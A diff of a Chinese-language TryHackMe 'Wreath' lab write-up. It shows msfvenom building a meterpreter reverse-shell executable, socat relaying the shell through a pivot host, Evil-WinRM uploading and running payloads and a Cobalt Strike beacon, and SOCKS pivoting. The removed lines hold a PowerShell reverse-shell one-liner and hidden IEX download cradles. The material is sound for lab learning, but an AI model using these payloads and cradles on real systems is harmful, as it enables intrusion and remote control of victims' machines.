@@ -454,7 +454,8 @@ sshuttle -r root@10.200.101.200 --ssh-cmd "ssh -i id_rsa" 10.200.101.0/24 -x 10.
 
 浏览器访问
 
-1661223640246.jpg
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661223640246.jpg)
 
 搜索web app漏洞
 ```
@@ -779,20 +780,181 @@ Supplemental Credentials:
 > shell whoami
 
 
-firewall-cmd --zone=public --add-port 8000/tcp
-
-./socat-max tcp-l:15123 tcp:10.50.102.104:80 &
 
 
-./socat-max tcp-l:8000 tcp:10.50.102.104:443
+## 转发rev shell流量到msf
+
+编译一个exe,ip和端口写linux转发机器的
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.200.101.200 LPORT=15123 -f exe >exp.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+
+```
+
+
+在linux机器用socat做一个rev shell转发
+```
+[root@prod-serv tmp]# ./socat-max TCP4-LISTEN:15123,FORK  TCP4:10.50.102.104:443
+```
+
+
+kali设置监听
+```
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.50.102.104    yes       The listen address (an interface may be specified)
+   LPORT     443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+```
+
+
+触发
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload exp.exe
+Info: Uploading exp.exe to C:\Users\Administrator\Documents\exp.exe
+
+                                                             
+Data: 98400 bytes of 98400 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\exp.exe
+
+```
+
+
+收到rev shell
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.50.102.104:443 
+[*] Sending stage (175174 bytes) to 10.200.101.200
+[*] Meterpreter session 2 opened (10.50.102.104:443 -> 10.200.101.200:60588) at 2022-08-24 05:08:24 -0400
+
+meterpreter > getuid
+Server username: GIT-SERV\Administrator
+
+```
 
 
 
-powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+## 转发rev shell流量到Cobalt Strike
+
+
+创建一个linux IP端口的监听http-n
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333191618.jpg)
+
+创建一个CS本地IP端口的监听http
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333299286.jpg)
+
+使用http-n监听生成一个exe文件
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333364837.jpg)
+
+在linux机器用socat做一个rev shell转发,这里注意转到本地的80端口，也就是上面http监听器的端口
+```
+[root@prod-serv tmp]# ./socat-max TCP4-LISTEN:15123,FORK  TCP4:10.50.102.104:80
+```
+
+
+上传到靶机执行
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload beacon.exe
+Info: Uploading beacon.exe to C:\Users\Administrator\Documents\beacon.exe
+
+                                                             
+Data: 384340 bytes of 384340 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> .\beacon.exe
+```
+
+
+收到返回的beacon
+
+
+![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661333509026.jpg)
 
 
 
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.102.104:3389/3389'))"
 
 
-powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.200.101.200:15123/a'))"
+
+# Task 33  Personal PC Enumeration
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.101.100 -TopPorts 50
+
+
+Hostname      : 10.200.101.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 443, 5900, 993...}
+finishTime    : 8/24/2022 9:58:37 AM
+
+```
+
+
+# Task 34  Personal PC Pivoting
+
+CS开启pivot
+
+```
+beacon> socks 1080
+[+] started SOCKS4a server on: 1080
+[+] host called home, sent: 16 bytes
+```
+
+扫描
+```
+┌──(root💀kali)-[~/tryhackme/Wreath]
+└─# proxychains nmap -p 80,3389 -sV 10.200.101.100 -Pn -sT
+...
+Nmap scan report for 10.200.101.100
+Host is up (4.3s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds
+
+```
+
+> Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
+
+> PHP 7.4.11
+
+
+
